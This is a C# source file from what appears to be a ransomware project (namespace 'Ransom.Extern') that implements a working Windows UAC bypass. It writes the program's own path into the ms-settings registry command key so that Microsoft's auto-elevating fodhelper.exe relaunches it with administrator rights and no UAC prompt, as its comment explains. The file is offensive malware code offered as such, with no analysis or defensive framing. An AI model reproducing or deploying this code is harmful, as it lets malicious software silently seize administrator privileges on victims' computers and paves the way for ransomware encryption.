using Shared;
using System;
using System.Security.Principal;

namespace Ransom.Extern
{
    class ElevatePrivs
    {
        private const string REGISTRY_NAME = "DelegateExecute";
        private const string FOD_HELPER = @"C:\Windows\System32\fodhelper.exe"; // This executable contains auto-elevation settings inside (Signed by Microsoft), which means the UAC prompt won't show up.
        private const string REGISTRY_PATH = @"Software\Classes\ms-settings\shell\open\command";

        public ElevatePrivs() { }

        public static bool IsRunningAsAdmin()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);

                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }

        private static void BypassUAC(string path)
        {
            try
            {
                Utils.ModifyRegister(0, REGISTRY_PATH, REGISTRY_NAME, "");
                Utils.ModifyRegister(0, REGISTRY_PATH, "", path);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public static bool TryGetAdmin()
        {
            if (IsRunningAsAdmin())
                return true;

            try
            {
                BypassUAC($"{Utils.CMD_PATH} /k \"{Config.CURRENT_PATH}\"");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                Environment.Exit(1);
            }

            return false;
        }
    }
}
